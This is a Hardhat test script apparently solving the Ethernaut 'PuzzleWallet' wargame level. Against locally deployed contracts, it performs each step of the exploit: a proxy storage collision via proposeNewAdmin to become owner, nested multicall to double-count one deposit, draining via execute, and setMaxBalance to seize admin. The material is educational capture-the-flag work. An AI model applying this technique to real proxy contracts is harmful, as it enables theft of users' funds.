import { expect } from "chai";
import { ethers } from "hardhat";

describe("PuzzleWallet", async function () {

  it("Should has the attacker has admin", async function () {
    //setup+
    const PuzzleWallet = await ethers.getContractFactory("PuzzleWallet");
    const puzzleWallet = await PuzzleWallet.deploy();
    await puzzleWallet.deployed();

    const [deployer, attacker] = await ethers.getSigners()

    const functionSignature = 'init(uint256)';
    const argumentValue = ethers.BigNumber.from(deployer.address);

    const functionHash = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(functionSignature)).slice(0, 10)
    const argumentBytes = ethers.utils.hexZeroPad(argumentValue.toHexString(), 32);
    const calldata = functionHash + argumentBytes.slice(2); // se omite el prefijo "0x"

    const PuzzleProxy = await ethers.getContractFactory("PuzzleProxy");
    const puzzleProxy = await PuzzleProxy.deploy(deployer.address, puzzleWallet.address, calldata);
    await puzzleProxy.deployed();

    const proxyAsImplementation = await ethers.getContractAt('PuzzleWallet', puzzleProxy.address)
    await proxyAsImplementation.addToWhitelist(deployer.address)
    await proxyAsImplementation.deposit({ value: 1000000000000000 })
    //setup-

    //1.First call PuzzleProxy to set the attacker address as owner
    await puzzleProxy.connect(attacker).proposeNewAdmin(attacker.address);
    //2.Call addToWhitelist to add the attacker address
    await proxyAsImplementation.connect(attacker).addToWhitelist(attacker.address);

    //3.Create the call data to multicall with the signature to call again multicall two times calling deposit on each one
    const depositSignature = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("deposit()")).slice(0, 10)
    const multicallSignature = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("multicall(bytes[])")).slice(0, 10)
    const encodedData = ethers.utils.defaultAbiCoder.encode(
      ['bytes[]'],
      [[depositSignature]]
    );
    const multicallComplete = multicallSignature + encodedData.slice(2)
    //4.Call multicall
    await proxyAsImplementation.connect(attacker).multicall([multicallComplete, multicallComplete], { value: 1000000000000000 })

    //5.Call execute to withdraw
    await proxyAsImplementation.connect(attacker).execute(attacker.address, await proxyAsImplementation.balances(attacker.address), "0x")

    //6.Set maxBalance as the attacker address
    await proxyAsImplementation.connect(attacker).setMaxBalance(attacker.address)

    expect(await puzzleProxy.admin()).to.eq(attacker.address)
  });
});

